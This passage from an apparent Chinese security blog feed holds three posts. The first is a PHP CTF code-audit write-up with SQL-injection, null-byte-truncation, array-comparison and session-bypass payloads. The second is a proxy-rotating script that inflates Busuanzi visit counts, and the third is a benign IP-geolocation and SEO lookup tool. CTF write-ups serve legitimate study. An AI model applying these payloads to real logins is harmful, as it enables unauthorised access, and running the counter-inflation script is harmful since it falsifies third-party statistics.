class="comment">-------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.010</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">group</span> <span class="keyword">by</span> pwd <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> pwd    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> mypass <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">group</span> <span class="keyword">by</span> pwd <span class="keyword">with</span> <span class="keyword">rollup</span> limit <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> pwd    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> mypass <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">group</span> <span class="keyword">by</span> pwd <span class="keyword">with</span> <span class="keyword">rollup</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> pwd    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> mypass <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">group</span> <span class="keyword">by</span> pwd <span class="keyword">with</span> <span class="keyword">rollup</span> limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>  <span class="operator">|</span> pwd <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure><p><code>limit 1</code>是指只查询<code>一行</code>，<code>offset 1</code>指查询某一行的内容，不同的数字出现的是不同行的内容</p><p>当用<code>with rollup</code>方法的时候，会在数据库的最后一行生成一个<code>密码</code>为<code>NULL</code>的字段，在查询的时候就可以想想办法让<code>pwd</code>为空，而<code>user</code>也是存在的，又有<code>mysql_num_rows($query) == 1</code>，所以可以构造<code>payload</code>：</p><p><code>admin&#39; or 1=1 group by pwd with rollup limit 1 offset x #</code></p><p>查询语句就是：</p><p><code>SELECT * FROM interest WHERE uname = &#39;admin&#39; or 1=1 group by pwd with rollup limit 1 offset x #&#39;</code></p><p>然后一个个试就行了。</p><p><font color=red>参考:</font></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/54772798">实验吧 因缺思汀的绕过 By Assassin（with rollup统计）</a></p><h2 id="0x05-ereg正则-00截断"><a href="#0x05-ereg正则-00截断" class="headerlink" title="0x05 ereg正则%00截断"></a>0x05 ereg正则%00截断</h2><p>直接看关键点审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ereg (<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span></span><br><span class="line"><span class="comment">// 要求GET密码只能是大小写字母和数字</span></span><br><span class="line">strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span></span><br><span class="line"><span class="comment">// 要求GET密码长度小于8并且值要大于9999999</span></span><br><span class="line">strpos (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span></span><br><span class="line"><span class="comment">// strpos()：查找字符串首次出现的位置</span></span><br></pre></td></tr></table></figure><p><code>第二点</code>可以利用<code>科学计数法</code>的方式表示。</p><p><code>第三点</code> <code>GET密码</code>中要包括<code>*-*</code>，但是前面的<code>ereg()</code>过滤了特殊字符，这时候可以用<code>%00</code>截断，<code>ereg()</code>读到<code>%00</code>的时候就截止了，所以构造<code>payload</code>：</p><p><code>1e9%00*-*</code></p><h2 id="0x06-strcmp比较字符串"><a href="#0x06-strcmp比较字符串" class="headerlink" title="0x06 strcmp比较字符串"></a>0x06 strcmp比较字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>], <span class="variable">$flag</span>) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span></span><br><span class="line">    <span class="comment">//比较两个字符串（区分大小写） </span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;No&#x27;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>strcmp()</code>期望传入类型是字符串类型，在<code>5.3</code>之前的<code>php</code>版本中若传入其他类型将会报错并返回<code>0</code>，<code>5.3</code>之后报错不返回任何值，但如果传入<code>数组</code>的话，就会返回<code>NULL</code>，这里的判断是<code>弱等于</code>，<code>NULL==0</code>是 <code>bool(true)</code>，所以有构造<code>payload</code>：</p><p><code>?a[]=1</code></p><h2 id="0x07-sha-函数比较绕过"><a href="#0x07-sha-函数比较绕过" class="headerlink" title="0x07 sha()函数比较绕过"></a>0x07 sha()函数比较绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === sha1(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Login first!&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$_GET[&#39;name&#39;] ！= $_GET[&#39;password&#39;]</code>同时满足<code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]</code></p><p><code>sha1()</code>默认的传入类型是<code>字符串</code>类型，若传入<code>数组</code>会返回<code>false</code>，这里的判断是<code>强等</code>，需要构造<code>username</code>和<code>password</code>既不相等，又同样要是<code>数组类型</code>，构造payload：</p><p><code>?name[]=a&amp;password[]=b</code></p><h2 id="0x08-SESSION验证绕过"><a href="#0x08-SESSION验证绕过" class="headerlink" title="0x08 SESSION验证绕过"></a>0x08 SESSION验证绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;&lt;p&gt;Wrong guess.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在于<code>$_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;]</code>，这就很简单了，只需要<code>GET</code>值与<code>SESSION</code>相等，</p><p>构造<code>payload</code>：</p><p><code>?password=</code></p><p>然后将<code>cookies</code>清空即可。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于不蒜子访问统计缺陷的利用</title>
      <link href="2020/about-busuanzi-exploits.html"/>
      <url>2020/about-busuanzi-exploits.html</url>
      
        <content type="html"><![CDATA[<p>今天本来打算写一个网站<code>seo</code>优化的<code>pytools</code>，但是在分析数据包时意外发现不蒜子的加载也太慢了吧，往往网页内容加载完了，不蒜子还要加载<code>10+</code>，于是想到很多访问都没通过不蒜子记录。于是随手写了个脚本来刷不蒜子访问统计量。没用的代码，纯属自娱自乐。</p><a id="more"></a><p>每次博客加载时我发现，不蒜子的统计数据总是最后才加载出来，比我这静态网页还慢。于是看看他怎么加载的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析网页加载数据包</p><p><img src="https://oss.zjun.info/zjun.info/busuanzi-2.png" alt="busuanzi-2"></p><p>推测这应该就是不蒜子通过访问其官网<code>api</code>来记录访问统计的<code>url</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;busuanzi.ibruce.info&#x2F;busuanzi?jsonpCallback&#x3D;BusuanziCallback_890848530338</span><br></pre></td></tr></table></figure><p><code>url</code>是这样的格式又考虑到这<code>get</code>值可能是随机生成的，先这样，脚本写好测测看。</p><p>因为不蒜子访问统计是记录<code>ip访问量</code>和<code>总访问量</code>。于是开启进程池。</p><p>这里推荐一个超好用的<a href="https://github.com/Python3WebSpider/ProxyPool">进程池</a>，docker安装体验更佳。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>然后代码完成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">proxypool_url = <span class="string">&#x27;http://127.0.0.1:5555/random&#x27;</span></span><br><span class="line">target_url = <span class="string">&#x27;http://busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback_9437822328&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;busuanzi.ibruce.info&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://www.zjun.info&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://www.zjun.info/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_proxy</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxy = requests.get(proxypool_url).text.strip()</span><br><span class="line">        proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://&#x27;</span> + proxy&#125;</span><br><span class="line">        re = requests.get(url=target_url, proxies=proxies, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> re.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">&#x27;seo成功  %-24s%s&#x27;</span> % (proxy, i))</span><br><span class="line">            print(re.text)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        t = Thread(target=get_random_proxy, args=(i, ))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>先用代理池不断访问一万次看看效果</p><p><img src="https://oss.zjun.info/zjun.info/busuanzi-3.png" alt="busuanzi-3"></p><p>10000次访问完成</p><p>这是最初是访问量：</p><p><img src="https://oss.zjun.info/zjun.info/busuanzi-4.png" alt="busuanzi-4"></p><p>这是脚本后的访问量：</p><p><img src="https://oss.zjun.info/zjun.info/busuanzi-5.png" alt="busuanzi-5"></p><p>增加了近2000，还行。</p>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 不蒜子 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于python的ip定位及权重查询脚本</title>
      <link href="2020/infoscan.html"/>
      <url>2020/infoscan.html</url>
      
        <content type="html"><![CDATA[<p>最近闲来无事，src也刷累了，无意间看到一朋友的定位脚本感觉很酷，寻思着自己写一个，而且还方便补天刷洞。</p><a id="more"></a><p>首先要ip定位，于是打算直接获取<code>www.ip.cn</code>的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ipaddress</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="comment"># 获取ip定位</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = (<span class="string">&#x27;https://www.ip.cn/?ip=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ip))</span><br><span class="line">        r = requests.get(url=url, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(</span><br><span class="line">            <span class="string">&#x27;setTimeout.*?所在地理位置：&lt;code&gt;(.*?)&lt;/code&gt;&lt;/p&gt;&lt;p&gt;GeoIP: &lt;code&gt;(.*?)&lt;/code&gt;&#x27;</span>,</span><br><span class="line">            re.S)</span><br><span class="line">        address = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">for</span> add <span class="keyword">in</span> address:</span><br><span class="line">            print(<span class="string">&#x27;GeoIP:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(add[<span class="number">1</span>]))</span><br><span class="line">            print(<span class="string">&#x27;地理位置:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(add[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>但是我们在实际应用中还会遇到url或者域名的情况，于是写了一个判断以及url转域名，域名转ip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_domain</span>(<span class="params">domain</span>):</span></span><br><span class="line">    <span class="comment"># url转域名</span></span><br><span class="line">    res = urlparse(domain)</span><br><span class="line">    <span class="keyword">return</span> res.netloc</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>(<span class="params">domain</span>):</span></span><br><span class="line">    <span class="comment"># 域名转ip</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = socket.getaddrinfo(domain, <span class="literal">None</span>)</span><br><span class="line">        ip = result[<span class="number">0</span>][<span class="number">4</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> ip</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>现在完成一半了，再加上个爱站网权重查询岂不是美滋滋，于是上爱站网卡卡点</p><p><img src="https://oss.zjun.info/zjun.info/infoscan-1.png" alt="infoscan-1"></p><p>API市场，感觉事情应该没那么简单，但是还是用常规requests爬虫试试，果然</p><p><img src="https://oss.zjun.info/zjun.info/infoscan-2.webp" alt="infoscan-2"></p><p>发现部分可以获取下来，部分显示为n，于是我重新审查了爱站网权重查询的过程，发现在查询一个从未查过的网站时，先是显示n，再显示成数字</p><p><img src="https://oss.zjun.info/zjun.info/infoscan-3.webp" alt="infoscan-3"></p><p><img src="https://oss.zjun.info/zjun.info/infoscan-4.webp" alt="infoscan-4"></p><p>再看看他的源码</p><p><img src="https://oss.zjun.info/zjun.info/infoscan-5.webp" alt="infoscan-5"></p><p>虽然前端页面刷新了但是网页源码还是n，于是刷新一次浏览器发现前端直接显示数字，源码也有数字了。这里我猜测第二次应该是直接返回的浏览器缓存，这里思路就清晰了。经<a href="http://forever404.cn/">Azrael</a>师傅提示写一个判断语句，权重是n就再requests请求一次看看能不能解决这个问题，试了下，问题依然存在。那应该就是requests请求并不记录缓存，而是每次请求就像第一次请求一样，都是全新的请求。这里我想到了就直接调用浏览器访问就行了呀。于是导入selenium模块调用Chrome浏览器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser=webdriver.Chrome()</span><br></pre></td></tr></table></figure><p>每次查询都刷新一次再爬取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_seo</span>(<span class="params">domain</span>):</span></span><br><span class="line">    <span class="comment"># 爱站网seo</span></span><br><span class="line">    azurl = <span class="string">&#x27;https://www.aizhan.com/seo/&#x27;</span></span><br><span class="line">    url = azurl + domain</span><br><span class="line">    browser.get(url)</span><br><span class="line">    browser.refresh()</span><br><span class="line">    html = browser.page_source</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&#x27;&#x27;&lt;li&gt;百度权重：&lt;a id=&quot;baidurank_br&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;移动权重：&lt;a id=&quot;baidurank_mbr&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;360权重：&lt;a id=&quot;360_pr&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;神马：&lt;a id=&quot;sm_pr&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;搜狗：&lt;a id=&quot;sogou_pr&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;谷歌PR：&lt;a id=&quot;google_pr&quot; target=&quot;_blank&quot;.*?alt=&quot;(.*?)&quot;&gt;&lt;/a&gt;&lt;/li&gt;.*?&lt;li&gt;备案号：&lt;a target=&quot;_blank&quot;.*?id=&quot;icp_icp&quot;&gt;(.*?)&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;性质：&lt;span id=&quot;icp_type&quot;&gt;(.*?)&lt;/span&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;名称：&lt;span id=&quot;icp_company&quot;&gt;(.*?)&lt;/span&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;审核时间：&lt;span id=&quot;icp_passtime&quot;&gt;(.*?)&lt;/span&gt;&lt;/li&gt;&#x27;&#x27;&#x27;</span>, re.S)</span><br><span class="line">    seos = re.findall(pattern, html)</span><br><span class="line">    <span class="keyword">for</span> seo <span class="keyword">in</span> seos:</span><br><span class="line">    print(<span class="string">&#x27;百度权重:&#123;&#125;  移动权重:&#123;&#125;  360权重:&#123;&#125;  神马:&#123;&#125;  搜狗:&#123;&#125;  谷歌PR:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(seo[<span class="number">0</span>], seo[<span class="number">1</span>], seo[<span class="number">2</span>], seo[<span class="number">3</span>], seo[<span class="number">4</span>], seo[<span class="number">5</span>]))</span><br><span class="line">        print(<span class="string">&#x27;备案号:&#123;&#125;  性质:&#123;&#125;  名称:&#123;&#125;  审核时间:&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(seo[<span class="number">6</span>], seo[<span class="number">7</span>], seo[<span class="number">8</span>], seo[<span class="number">9</span>]))</span><br></pre></td></tr></table></figure><p>但是这样每次用脚本都得弹出个Chrome浏览器很不爽，于是换成<a href="https://phantomjs.org/">phantomjs</a>无界面浏览器。我的archlinux没安装，于是安装一个，编译了是十分钟还报错编译失败。。。算了直接上官网下载安装并配置环境变量吧。</p><p>万事具备运行一下</p><p>提示报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UserWarning: Selenium support <span class="keyword">for</span> PhantomJS has been deprecated, please use headless versions of Chrome <span class="keyword">or</span> Firefox instead</span><br><span class="line">warnings.warn(<span class="string">&#x27;Selenium support for PhantomJS has been deprecated, please use headless &#x27;</span>）</span><br></pre></td></tr></table></figure><p>用是能用，但是看见报错总是不爽的</p><p>报错意思是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户警告：对PhantomJS的Selenium支持已经被弃用，请改用Chrome或Firefox的无头版本</span><br><span class="line"></span><br><span class="line">warning.warn（&#39;对PhantomJS的Selenium支持已被弃用，请使用headless&#39;）</span><br></pre></td></tr></table></figure><p>那好吧，不能用phantomjs了，看了看新的用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line">browser = webdriver.Chrome(options=chrome_options)</span><br></pre></td></tr></table></figure><p>然后，做了一些简单优化就完成了，看看效果</p><p><img src="https://oss.zjun.info/zjun.info/infoscan-6.webp" alt="infoscan-6"></p><p>由于需要后台开启浏览器而且每次获取权重都得访问两遍，所以速度有些缓慢，还待改进。</p><p>项目地址：</p><p><a href="https://github.com/z1un/infoscan">https://github.com/z1un/infoscan</a></p>]]></content>
      
      
